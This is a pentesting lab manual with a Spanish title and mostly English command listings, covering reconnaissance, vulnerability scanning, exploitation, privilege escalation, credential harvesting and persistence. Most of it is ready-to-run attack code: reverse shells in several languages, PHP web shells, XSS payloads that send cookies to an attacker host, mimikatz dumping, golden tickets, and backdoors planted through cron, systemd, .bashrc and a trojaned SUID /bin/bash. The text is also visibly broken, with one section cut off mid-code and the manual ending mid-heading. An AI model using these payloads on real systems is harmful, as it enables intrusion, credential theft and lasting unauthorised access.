# Manual Completo de Laboratorios de Pentesting
*Guía profesional para auditorías de seguridad y pruebas de penetración*

---

## 📋 Tabla de Contenidos

1. [Fundamentos y Marco Legal](#fundamentos-y-marco-legal)
2. [Configuración del Laboratorio](#configuración-del-laboratorio)
3. [Metodología OWASP/OSSTMM](#metodología-owasposstmm)
4. [Arsenal de Herramientas](#arsenal-de-herramientas)
5. [Fase 1: Reconocimiento Pasivo (OSINT)](#fase-1-reconocimiento-pasivo-osint)
6. [Fase 2: Reconocimiento Activo](#fase-2-reconocimiento-activo)
7. [Fase 3: Enumeración y Mapeo de Servicios](#fase-3-enumeración-y-mapeo-de-servicios)
8. [Fase 4: Análisis de Vulnerabilidades](#fase-4-análisis-de-vulnerabilidades)
9. [Fase 5: Explotación](#fase-5-explotación)
10. [Fase 6: Post-Explotación y Escalada](#fase-6-post-explotación-y-escalada)
11. [Documentación y Reportes](#documentación-y-reportes)
12. [Plan de Entrenamiento 30 Días](#plan-de-entrenamiento-30-días)
13. [Checklist Final](#checklist-final)

---

## 🔒 Fundamentos y Marco Legal

### Principios Básicos
- **Objetivo del Pentester**: Pensar como atacante, actuar con método científico, documentar todo
- **Autorización Escrita**: Todo pentest legítimo requiere autorización por escrito
- **Scope Definido**: Límites claros del alcance y reglas de engagement
- **No Disclosure**: Acuerdos de confidencialidad firmados

### Marco Legal Obligatorio
- **Aspectos Legales**: Conocimiento de leyes locales sobre acceso informático
- **Ética Profesional**: Contratos de pruebas, definición de scope
- **Cumplimiento**: Capacidad para justificar cualquier acción ante un juez o cliente

### Principios de Actuación
- **Disciplina**: Todo queda documentado como evidencia forense
- **Método**: Cada hallazgo → hipótesis + evidencia + recomendación
- **Prioridad**: Critical, High, Medium, Low con justificación de impacto
- **No Daño**: Pruebas que no destruyan datos del cliente
- **Telemetry-Aware**: Considerar qué vería el defensor (logs, IDS, EDR)
- **Control Emocional**: Pentesting es paciencia, no espectáculo

---

## 🛠️ Configuración del Laboratorio

### Requisitos de Hardware
- **Host Físico**: Mínimo 16GB RAM, CPU multi-core
- **Almacenamiento**: 500GB disponibles para VMs
- **Red**: Tarjeta de red dedicada para laboratorio

### Configuración de Virtualización
```bash
# Configuración con VirtualBox/VMware/Proxmox
# Red aislada (host-only) para VMs del laboratorio
# NAT controlado solo para actualizaciones
```

### VMs Recomendadas

#### Máquina Atacante
- **Kali Linux**: Distribución principal
- **Parrot Security OS**: Alternativa con herramientas adicionales
- **BlackArch**: Especializada en herramientas de seguridad

#### Máquinas Objetivo
- **Metasploitable 2/3**: Vulnerabilidades conocidas
- **DVWA**: Damn Vulnerable Web Application
- **WebGoat**: OWASP Training Platform
- **Juice Shop**: Modern vulnerable web app
- **VulnHub VMs**: Máquinas descargables legalmente
- **HackTheBox Retired**: Máquinas retiradas para práctica

### Configuración de Red Segura
```bash
# Crear red host-only
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 10.0.0.1 --netmask 255.255.255.0

# Configurar captura de tráfico
sudo tcpdump -i vboxnet0 -w lab_capture.pcap

# Snapshots obligatorios antes de cada ejercicio
VBoxManage snapshot "KaliVM" take "clean_state"
```

---

## 📊 Metodología OWASP/OSSTMM

### Fases del Pentesting

1. **Planificación** → Reglas, alcance, objetivos
2. **Reconocimiento** → Recolección pasiva de información
3. **Enumeración** → Identificación activa de activos
4. **Análisis de Vulnerabilidades** → Priorización de vectores
5. **Explotación** → Ganar acceso controlado
6. **Post-Explotación** → Escalada y movimiento lateral
7. **Reporte** → Documentación ejecutiva y técnica

### Estándares de Referencia
- **NIST SP-800-115**: Guía técnica para pruebas de seguridad
- **OWASP Testing Guide**: Metodología para aplicaciones web
- **MITRE ATT&CK**: Framework de técnicas de adversarios

---

## ⚔️ Arsenal de Herramientas

### Herramientas de Reconocimiento

#### OSINT (Open Source Intelligence)
| Herramienta | Función | Comando Ejemplo |
|-------------|---------|-----------------|
| **whois** | Información de dominio | `whois target.com` |
| **nslookup/dig** | Resolución DNS | `dig target.com any` |
| **theHarvester** | Emails y subdominios | `theHarvester -d target.com -b google` |
| **Maltego** | Análisis de relaciones | GUI-based |
| **Recon-ng** | Framework OSINT | `recon-ng` |
| **Shodan** | Motor de búsqueda IoT | Web interface |
| **Censys** | Análisis de certificados | Web interface |
| **SpiderFoot** | Automatización OSINT | `spiderfoot -s target.com` |

#### Subdomain Discovery
```bash
# Subfinder - Passive subdomain discovery
subfinder -d target.com -o subdomains.txt

# Amass - Comprehensive subdomain enumeration
amass enum -d target.com -o amass_results.txt

# Assetfinder - Simple subdomain finder
assetfinder target.com | tee assetfinder_results.txt

# Knock - Subdomain scanner
python knock.py target.com
```

### Herramientas de Enumeración

#### Network Scanning
| Herramienta | Función | Comandos Clave |
|-------------|---------|----------------|
| **Nmap** | Port scanning y OS detection | Ver sección detallada |
| **Masscan** | High-speed port scanner | `masscan -p1-65535 10.0.0.0/8 --rate=1000` |
| **Zmap** | Internet-wide scanning | `zmap -p 22 10.0.0.0/8` |
| **RustScan** | Modern port scanner | `rustscan -a 10.10.10.1 -- -sC -sV` |

#### Web application vulnerabilities
nmap --script http-vuln-* -p 80,443 10.10.10.1

# SSL/TLS vulnerabilities
nmap --script ssl-* -p 443 10.10.10.1
```

#### 2. OpenVAS/Greenbone Vulnerability Scanner
```bash
# Install and setup OpenVAS
sudo apt update && sudo apt install openvas
sudo gvm-setup

# Start services
sudo gvm-start

# Web interface available at https://127.0.0.1:9392
# Default credentials: admin / generated_password

# Command line scanning
gvm-cli socket --xml "<create_target><name>Target1</name><hosts>10.10.10.1</hosts></create_target>"
```

#### 3. Nuclei - Fast Vulnerability Scanner
```bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Basic vulnerability scan
nuclei -u http://10.10.10.1

# Scan with specific severity
nuclei -u http://10.10.10.1 -severity critical,high

# Scan multiple targets
nuclei -l targets.txt -o nuclei_results.txt

# Custom templates directory
nuclei -u http://10.10.10.1 -t ~/custom-templates/

# Technology-specific scans
nuclei -u http://10.10.10.1 -tags wordpress,apache,ssl
```

#### 4. Vulnerability Research and CVE Analysis
```bash
# SearchSploit - Local exploit database
searchsploit apache 2.4.29
searchsploit -m 47887  # Mirror exploit locally
searchsploit -p 47887  # Show path to exploit

# CVE Details lookup
curl -s "https://cvedetails.com/json-feed.php?numrows=10&vendor_id=45&product_id=66&version_id="

# Online vulnerability databases
# - CVE Details: https://www.cvedetails.com/
# - NVD: https://nvd.nist.gov/
# - Exploit-DB: https://www.exploit-db.com/
# - Packet Storm: https://packetstormsecurity.com/
```

### Web Application Vulnerability Assessment

#### 1. OWASP Top 10 Testing

##### A01: Broken Access Control
```bash
# Directory traversal testing
curl "http://10.10.10.1/page.php?file=../../../etc/passwd"
curl "http://10.10.10.1/page.php?file=....//....//....//etc/passwd"

# Parameter pollution
curl "http://10.10.10.1/user.php?id=1&id=2"

# HTTP method testing
curl -X OPTIONS http://10.10.10.1/admin/
curl -X PUT http://10.10.10.1/upload.php -d "test data"
```

##### A02: Cryptographic Failures
```bash
# SSL/TLS testing
sslscan 10.10.10.1:443
sslyze --regular 10.10.10.1:443
testssl.sh https://10.10.10.1

# Weak cipher detection
nmap --script ssl-enum-ciphers -p 443 10.10.10.1
```

##### A03: Injection Vulnerabilities
```bash
# SQL Injection testing with SQLMap
sqlmap -u "http://10.10.10.1/page.php?id=1" --dbs
sqlmap -u "http://10.10.10.1/page.php?id=1" --dump-all
sqlmap -u "http://10.10.10.1/page.php?id=1" --os-shell

# Manual SQL injection testing
curl "http://10.10.10.1/page.php?id=1'"
curl "http://10.10.10.1/page.php?id=1 OR 1=1--"
curl "http://10.10.10.1/page.php?id=1; DROP TABLE users;--"

# NoSQL injection
curl "http://10.10.10.1/api/users" -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Command injection
curl "http://10.10.10.1/ping.php?host=127.0.0.1; id"
curl "http://10.10.10.1/ping.php?host=127.0.0.1 | whoami"
```

##### A04: Insecure Design
```bash
# Business logic testing
curl -X POST "http://10.10.10.1/transfer.php" -d "from=user1&to=user2&amount=-1000"
curl -X POST "http://10.10.10.1/purchase.php" -d "item=laptop&quantity=-1"

# Workflow bypass
curl -X POST "http://10.10.10.1/step3.php" -d "data=test"  # Skip step 1 and 2
```

##### A05: Security Misconfiguration
```bash
# Default credentials testing
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv http-get://10.10.10.1/admin/

# Information disclosure
curl -s http://10.10.10.1/.env
curl -s http://10.10.10.1/.git/config
curl -s http://10.10.10.1/server-status
curl -s http://10.10.10.1/server-info
```

##### A06: Vulnerable and Outdated Components
```bash
# Component identification
retire --js --outputformat json --outputpath retire_results.json http://10.10.10.1

# WordPress vulnerability scanning
wpscan --url http://10.10.10.1 --enumerate vp,vt,u,dbe
```

#### 2. Automated Web Vulnerability Scanners

##### OWASP ZAP
```bash
# ZAP Baseline scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py -t http://10.10.10.1

# ZAP Full scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t http://10.10.10.1
```

##### Burp Suite Professional
```bash
# Command line scanning (requires license)
java -jar burpsuite_pro.jar --project-file=project.burp --config-file=config.json
```

### Network Vulnerability Assessment

#### 1. SMB Vulnerabilities
```bash
# EternalBlue (MS17-010) detection
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.1

# SMB signing detection
nmap --script smb-security-mode,smb2-security-mode -p 445 10.10.10.1

# SMBGhost (CVE-2020-0796) detection
nmap --script smb2-vuln-uptime -p 445 10.10.10.1
```

#### 2. SSL/TLS Vulnerabilities
```bash
# Heartbleed detection
nmap --script ssl-heartbleed -p 443 10.10.10.1

# POODLE detection
nmap --script ssl-poodle -p 443 10.10.10.1

# BEAST detection
nmap --script ssl-enum-ciphers -p 443 10.10.10.1 | grep "TLSv1.0\|SSLv3"
```

#### 3. Database Vulnerabilities
```bash
# MySQL vulnerabilities
nmap --script mysql-* -p 3306 10.10.10.1

# PostgreSQL vulnerabilities
nmap --script pgsql-brute -p 5432 10.10.10.1

# MSSQL vulnerabilities
nmap --script ms-sql-* -p 1433 10.10.10.1
```

### Vulnerability Prioritization Framework

#### CVSS Score Calculation
```bash
# Manual CVSS calculation factors:
# Base Score: Exploitability + Impact
# - Attack Vector (Network/Adjacent/Local/Physical)
# - Attack Complexity (Low/High)
# - Privileges Required (None/Low/High)
# - User Interaction (None/Required)
# - Confidentiality Impact (None/Low/High)
# - Integrity Impact (None/Low/High)
# - Availability Impact (None/Low/High)

# Example: SQLi with network access, no auth required
# AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)
```

#### Risk Assessment Matrix
```bash
# Create vulnerability report template
cat << 'EOF' > vuln_template.txt
Vulnerability ID: VULN-001
Title: SQL Injection in login.php
CVSS Score: 9.8 (Critical)
CWE: CWE-89
Affected Asset: http://10.10.10.1/login.php
Description: The login.php parameter 'username' is vulnerable to SQL injection
Impact: Complete database compromise, authentication bypass
Proof of Concept: 
Evidence: [Screenshot/Command output]
Recommendation: Use parameterized queries, input validation
References: 
- OWASP SQL Injection Prevention: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
EOF
```

---

## ⚡ Fase 5: Explotación

### Objetivo
Convertir vulnerabilidades identificadas en acceso real al sistema, validando el impacto de cada fallo encontrado de manera controlada y documentada.

### Exploitation Frameworks

#### 1. Metasploit Framework
```bash
# Iniciar Metasploit
msfconsole

# Actualizar base de datos
msfdb init
msfdb reinit  # Si hay problemas

# Búsqueda de exploits
search MS17-010
search apache
search type:exploit platform:linux

# Información del exploit
info exploit/windows/smb/ms17_010_eternalblue

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar opciones
set RHOSTS 10.10.10.1
set RPORT 445
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444

# Verificar configuración
show options
show targets
show payloads

# Ejecutar exploit
exploit
run
```

#### 2. Exploit Development y Manual Exploitation
```bash
# Compile exploits
gcc -o exploit exploit.c
python2 exploit.py 10.10.10.1 4444

# Shellcode generation
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell.elf

# Custom payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_shell.exe
```

### Web Application Exploitation

#### 1. SQL Injection Exploitation
```bash
# SQLMap automated exploitation
sqlmap -u "http://10.10.10.1/login.php" --data="username=admin&password=pass" --level=5 --risk=3

# Database enumeration
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --dbs
sqlmap -u "http://10.10.10.1/vuln.php?id=1" -D database --tables
sqlmap -u "http://10.10.10.1/vuln.php?id=1" -D database -T users --columns
sqlmap -u "http://10.10.10.1/vuln.php?id=1" -D database -T users -C username,password --dump

# OS command execution
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --os-shell
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --os-cmd="whoami"

# File system access
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

#### 2. Cross-Site Scripting (XSS)
```bash
# Reflected XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

# Stored XSS
<script>document.location='http://10.10.14.1/steal.php?cookie='+document.cookie</script>

# DOM-based XSS
#<img src=x onerror=alert('XSS')>

# Advanced XSS payloads
<script>fetch('http://10.10.14.1/steal.php?data='+btoa(document.documentElement.innerHTML))</script>
```

#### 3. Command Injection
```bash
# Basic command injection
; id
| whoami
& dir
$(whoami)
`id`

# Bypassing filters
; wh""oami
; who'ami'
; echo $HOME

# Blind command injection
; sleep 10
; ping -c 4 10.10.14.1
; curl http://10.10.14.1/test.txt
```

#### 4. File Upload Vulnerabilities
```bash
# PHP web shell
<?php system($_GET['cmd']); ?>
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"'); ?>

# Bypassing upload restrictions
# Change extension: shell.php.jpg
# Double extension: shell.jpg.php
# Null byte: shell.php%00.jpg
# MIME type bypass: Content-Type: image/jpeg

# Advanced PHP shells
<?php
$cmd = $_GET['cmd'];
if(isset($cmd)) {
    system($cmd . ' 2>&1');
}
?>
```

#### 5. Local File Inclusion (LFI) / Remote File Inclusion (RFI)
```bash
# Basic LFI
http://10.10.10.1/page.php?file=../../../etc/passwd
http://10.10.10.1/page.php?file=....//....//....//etc/passwd

# Log poisoning
http://10.10.10.1/page.php?file=/var/log/apache2/access.log
# Poison log with: User-Agent: <?php system($_GET['cmd']); ?>

# PHP wrappers
http://10.10.10.1/page.php?file=php://filter/convert.base64-encode/resource=config.php
http://10.10.10.1/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B

# RFI (if allow_url_include is on)
http://10.10.10.1/page.php?file=http://10.10.14.1/shell.txt
```

### Network Service Exploitation

#### 1. SMB Exploitation
```bash
# EternalBlue exploitation (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
exploit

# SMB relay attack
python3 ntlmrelayx.py -t 10.10.10.1 -smb2support

# Pass-the-hash attack
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 administrator@10.10.10.1
```

#### 2. SSH Exploitation
```bash
# Brute force attack
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1
medusa -h 10.10.10.1 -u root -P passwords.txt -M ssh

# Key-based authentication bypass (if misconfigured)
ssh-keygen -t rsa -b 4096 -f id_rsa
ssh-copy-id -i id_rsa.pub user@10.10.10.1

# SSH tunneling for pivoting
ssh -L 8080:127.0.0.1:80 user@10.10.10.1
ssh -D 9050 user@10.10.10.1  # SOCKS proxy
```

#### 3. FTP Exploitation
```bash
# Anonymous FTP access
ftp 10.10.10.1
# anonymous / anonymous

# FTP bounce attack
nmap -b ftp-user:ftp-pass@10.10.10.1 target.com

# FTP brute force
hydra -l admin -P passwords.txt ftp://10.10.10.1
```

### Password Attacks

#### 1. Hash Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt
john --show hashes.txt

# Hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512

# Custom wordlist generation
cewl http://10.10.10.1 -w custom_wordlist.txt
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```

#### 2. Network Authentication Attacks
```bash
# Hydra - Multiple protocols
hydra -L users.txt -P passwords.txt ssh://10.10.10.1
hydra -l admin -P passwords.txt http-post-form://10.10.10.1/login.php:"username=^USER^&password=^PASS^:Invalid"
hydra -l admin -P passwords.txt smb://10.10.10.1

# Medusa
medusa -h 10.10.10.1 -u admin -P passwords.txt -M http

# Ncrack
ncrack -vv --user admin -P passwords.txt rdp://10.10.10.1
```

### Reverse Shells and Bind Shells

#### 1. Common Reverse Shells
```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"

# Netcat reverse shell
nc -e /bin/bash 10.10.14.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell
php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### 2. Shell Stabilization
```bash
# Python TTY upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Full shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (background)
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
stty rows 38 columns 116  # Adjust to your terminal size
```

#### 3. Meterpreter Sessions
```bash
# Meterpreter commands
sysinfo
getuid
ps
migrate <PID>
getsystem
hashdump
screenshot
keyscan_start
keyscan_dump
download /etc/passwd
upload shell.exe C:\\temp\\shell.exe
```

### Exploitation Documentation

#### 1. Evidence Collection
```bash
# Screenshot evidence
import -window root screenshot_$(date +%Y%m%d_%H%M%S).png

# Command logging
script -a exploitation_log_$(date +%Y%m%d_%H%M%S).txt

# Network capture
tcpdump -i tun0 -w exploitation_traffic.pcap host 10.10.10.1

# Hash verification
sha256sum exploit_file.exe > exploit_file.exe.sha256
md5sum payload.php > payload.php.md5
```

#### 2. Exploitation Report Template
```bash
cat << 'EOF' > exploitation_report.md
# Exploitation Report

## Target Information
- Target IP: 10.10.10.1
- Service: HTTP/80
- Vulnerability: SQL Injection in login.php

## Exploitation Details
- Exploit Used: Manual SQL Injection
- Payload: ' OR 1=1-- 
- Access Gained: Database access, authentication bypass
- Privileges: www-data user

## Evidence
- Screenshot: [Attached]
- Command Output: [Attached]
- Network Capture: [Attached]

## Impact Assessment
- Confidentiality: HIGH - Access to user database
- Integrity: MEDIUM - Ability to modify data
- Availability: LOW - No service disruption

## Next Steps
- Attempt privilege escalation
- Search for sensitive files
- Check for lateral movement opportunities
EOF
```

---

## 🚀 Fase 6: Post-Explotación y Escalada

### Objetivo
Expandir el acceso inicial obtenido, elevar privilegios, mantener persistencia, moverse lateralmente por la red y documentar todos los activos comprometidos.

### System Information Gathering

#### 1. Linux System Enumeration
```bash
# Basic system information
whoami
id
uname -a
cat /etc/os-release
cat /etc/issue
hostname
uptime

# Network information
ifconfig -a
ip addr show
ip route
netstat -tuln
ss -tuln
arp -a

# Process and services
ps aux
ps -ef
systemctl list-units --type=service --state=running
service --status-all

# Users and groups
cat /etc/passwd
cat /etc/group
last
w
who

# File system
df -h
mount
cat /etc/fstab
lsblk

# Environment variables
env
printenv
```

#### 2. Windows System Enumeration
```powershell
# Basic system information
whoami
whoami /all
hostname
systeminfo

# Network information
ipconfig /all
route print
netstat -an
arp -a

# Process and services
tasklist
wmic process list
sc query
net start

# Users and groups
net user
net localgroup
net localgroup administrators
query user

# File system
wmic logicaldisk get caption,description,size,freespace

# Environment variables
set
```

### Automated Enumeration Tools

#### 1. Linux Privilege Escalation
```bash
# LinPEAS - Comprehensive Linux enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > linpeas_results.txt

# LinEnum - Linux enumeration script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t -k password -r LinEnum_report.txt

# Linux Smart Enumeration (LSE)
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh
./lse.sh -l2 -i

# Unix-privesc-check
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard
```

#### 2. Windows Privilege Escalation
```powershell
# WinPEAS - Windows enumeration
iwr -uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -outfile winpeas.exe
.\winpeas.exe

# PowerUp - PowerShell privilege escalation
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt - Security enumeration
.\Seatbelt.exe all

# SharpUp - C# version of PowerUp
.\SharpUp.exe
```

### Manual Privilege Escalation Techniques

#### 1. Linux Privilege Escalation

##### SUDO Exploitation
```bash
# Check sudo permissions
sudo -l

# GTFOBins exploitation examples
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /home -exec /bin/sh \; -quit
sudo nmap --interactive
nmap> !sh

# Sudo version vulnerabilities
sudo --version
# Check for CVE-2019-14287, CVE-2019-18634, etc.
```

##### SUID/SGID Binaries
```bash
# Find SUID/SGID files
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -2000 2>/dev/null
find / -type f -perm -6000 2>/dev/null

# Common SUID exploits
/usr/bin/find . -exec /bin/sh \; -quit
/usr/bin/vim -c ':!/bin/sh'
echo "os.execute('/bin/sh')" > /tmp/shell.nse && /usr/bin/nmap --script=/tmp/shell.nse

# Advanced SUID exploitation
# If /usr/bin/cp has SUID
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$TUdqhnxw$XBNfA.l.9k0J5i.2PWmV51:0:0:root:/root:/bin/bash' >> /etc/passwd
```

##### Capabilities
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Common capability exploits
# cap_setuid+ep
./python -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_dac_read_search
./tar -cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

##### Cron Jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Check for writable cron scripts
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# Exploit example
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /path/to/cronjob/script.sh
```

##### Kernel Exploits
```bash
# Check kernel version
uname -a
cat /proc/version

# Common kernel exploits
searchsploit linux kernel 4.4
searchsploit dirty cow
searchsploit overlayfs

# Compile and run exploit
gcc -o exploit exploit.c
./exploit
```

#### 2. Windows Privilege Escalation

##### Token Impersonation
```powershell
# Check current privileges
whoami /priv

# If SeImpersonatePrivilege is enabled
# Use JuicyPotato, RoguePotato, or PrintSpoofer
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *

# Meterpreter
getsystem
getprivs
```

##### Service Exploits
```powershell
# Check for vulnerable services
sc query state= all
wmic service get name,displayname,pathname,startmode

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """

# Service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
```

##### Registry Exploits
```powershell
# Check for AutoRun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Credential Harvesting

#### 1. Linux Credential Harvesting
```bash
# Password files
cat /etc/passwd
cat /etc/shadow

# SSH keys
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_dsa" 2>/dev/null

# Configuration files with passwords
grep -r "password" /etc/
find /home -name "*.config" -exec grep -l "password" {} \;

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.python_history

# Database credentials
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
find /var/www -name "*.php" -exec grep -l "mysql\|mysqli\|pgsql" {} \;

# Memory dumps
strings /dev/mem | grep -i "password"
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_bash

# Browser data
find / -name "*.sqlite" 2>/dev/null | grep -i browser
find / -name "cookies.txt" -o -name "passwords.txt" 2>/dev/null
```

#### 2. Windows Credential Harvesting
```powershell
# Mimikatz - The ultimate Windows credential harvester
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::tspkg
sekurlsa::credman
lsadump::sam
lsadump::cache
lsadump::secrets

# Alternative tools
# LaZagne - Credential recovery
.\LaZagne.exe all

# Windows Credential Editor (WCE)
wce.exe -w

# Registry credential extraction
reg save HKLM\sam sam.hive
reg save HKLM\security security.hive
reg save HKLM\system system.hive

# Impacket secretsdump
python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Browser credentials
# Chrome passwords location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Firefox passwords location: %APPDATA%\Mozilla\Firefox\Profiles\<profile>\logins.json

# DPAPI extraction
mimikatz.exe
dpapi::masterkey /in:key_file /sid:S-1-5-21... /password:userpassword
dpapi::cred /in:credential_file /masterkey:master_key
```

#### 3. Active Directory Credential Attacks
```powershell
# Kerberoasting
# PowerView
Get-DomainSPNTicket -SPN "MSSQLSvc/sql01.domain.local"

# Impacket
python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# ASREPRoasting
# PowerView
Get-DomainUser -PreauthNotRequired -Verbose

# Impacket
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.1 -request

# Golden Ticket Attack
mimikatz.exe
lsadump::dcsync /domain:domain.local /user:krbtgt
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /krbtgt:hash /ticket:golden.kirbi
```

### Persistence Mechanisms

#### 1. Linux Persistence
```bash
# SSH key persistence
mkdir -p /home/user/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys

# Cron job persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'") | crontab -

# Service persistence
cat << 'EOF' > /etc/systemd/system/backdoor.service
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# .bashrc persistence
echo "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" >> /home/user/.bashrc

# Binary replacement
cp /bin/bash /tmp/bash_backup
cat << 'EOF' > /tmp/malicious_bash.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    setuid(0);
    setgid(0);
    system("/tmp/bash_backup");
    system("bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 &");
    return 0;
}
EOF

gcc -o /bin/bash /tmp/malicious_bash.c
chmod 4755 /bin/bash
```

#### 2. Windows Persistence
```powershell
# Registry Run keys
